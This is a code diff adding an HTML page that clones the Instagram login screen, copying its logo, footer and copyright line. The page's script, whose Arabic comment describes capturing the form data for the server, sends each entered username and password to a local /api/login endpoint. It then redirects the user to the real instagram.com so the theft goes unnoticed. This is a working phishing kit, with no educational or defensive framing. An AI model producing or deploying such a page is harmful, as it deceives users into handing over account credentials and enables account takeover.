@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram Login</title>
+  <link rel="stylesheet" href="style.css" />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap"
+    rel="stylesheet"
+  />
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-box">
+      <img
+        src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png"
+        alt="Instagram Logo"
+        class="instagram-logo"
+      />
+
+      <form class="login-form">
+        <input
+          type="text"
+          placeholder="Phone number, username, or email"
+          required
+        />
+        <input type="password" placeholder="Password" required />
+        <button type="submit" class="login-button">Log In</button>
+      </form>
+
+      <div class="or-separator">
+        <div class="line"></div>
+        <div class="or-text">OR</div>
+        <div class="line"></div>
+      </div>
+
+      <a href="#" class="facebook-login">
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/1200px-2021_Facebook_icon.svg.png"
+          alt="Facebook Icon"
+          class="facebook-icon"
+        />
+        Log in with Facebook
+      </a>
+
+      <a href="#" class="forgot-password">Forgot password?</a>
+    </div>
+
+    <div class="signup-box">
+      <p>
+        Don't have an account? <a href="#" class="signup-link">Sign up</a>
+      </p>
+    </div>
+  </div>
+
+  <footer>
+    <div class="footer-links">
+      <a href="#">Meta</a>
+      <a href="#">About</a>
+      <a href="#">Blog</a>
+      <a href="#">Jobs</a>
+      <a href="#">Help</a>
+      <a href="#">API</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+      <a href="#">Locations</a>
+      <a href="#">Language</a>
+      <a href="#">Instagram Lite</a>
+      <a href="#">Threads</a>
+      <a href="#">Uploading Non-Users & Contacts</a>
+      <a href="#">Meta Verified</a>
+    </div>
+    <p class="copyright">&copy; 2025 Instagram from Meta</p>
+  </footer>
+
+  <script>
+    // سكربت محسن لالتقاط بيانات الفورم وإرسالها للسيرفر
+    const form = document.querySelector('.login-form');
+    const loginButton = form.querySelector('.login-button');
+    const originalButtonText = loginButton.textContent;
+
+    form.addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const username = form.querySelector('input[type="text"]').value.trim();
+      const password = form.querySelector('input[type="password"]').value;
+
+      if (!username || !password) {
+        showMessage('يرجى ملء جميع الحقول', 'error');
+        return;
+      }
+
+      // Show loading state
+      loginButton.disabled = true;
+      loginButton.textContent = 'جاري تسجيل الدخول...';
+      loginButton.style.opacity = '0.7';
+
+      try {
+        const res = await fetch('/api/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username, password }),
+        });
+
+        const data = await res.json();
+
+        if (res.ok && data.success) {
+          showMessage('تم تسجيل الدخول بنجاح', 'success');
+          form.reset();
+          // Redirect after a short delay to simulate real Instagram behavior
+          setTimeout(() => {
+            window.location.href = 'https://www.instagram.com/';
+          }, 1500);
+        } else {
+          showMessage(data.message || 'حدث خطأ أثناء تسجيل الدخول', 'error');
+        }
+      } catch (err) {
+        console.error('Network error:', err);
+        showMessage('تعذر الاتصال بالخادم. يرجى المحاولة مرة أخرى.', 'error');
+      } finally {
+        // Reset button state
+        loginButton.disabled = false;
+        loginButton.textContent = originalButtonText;
+        loginButton.style.opacity = '1';
+      }
+    });
+
+    function showMessage(message, type) {
+      // Remove existing message if any
+      const existingMessage = document.querySelector('.message');
+      if (existingMessage) {
+        existingMessage.remove();
+      }
+
+      // Create new message element
+      const messageDiv = document.createElement('div');
+      messageDiv.className = `message ${type}`;
+      messageDiv.textContent = message;
+      messageDiv.style.cssText = `
+        padding: 10px;
+        margin: 10px 0;
+        border-radius: 4px;
+        text-align: center;
+        font-size: 14px;
+        ${type === 'error' ? 
+          'background-color: #ff3040; color: white;' : 
+          'background-color: #00a400; color: white;'
+        }
+      `;
+
+      // Insert message after the form
+      form.parentNode.insertBefore(messageDiv, form.nextSibling);
+
+      // Auto remove message after 5 seconds
+      setTimeout(() => {
+        if (messageDiv.parentNode) {
+          messageDiv.remove();
+        }
+      }, 5000);
+    }
+
+    // Add input validation styling
+    const inputs = form.querySelectorAll('input');
+    inputs.forEach(input => {
+      input.addEventListener('blur', function() {
+        if (this.value.trim() === '') {
+          this.style.borderColor = '#ff3040';
+        } else {
+          this.style.borderColor = '#363636';
+        }
+      });
+
+      input.addEventListener('focus', function() {
+        this.style.borderColor = '#0095f6';
+      });
+    });
+  </script>
+</body>
+</html>
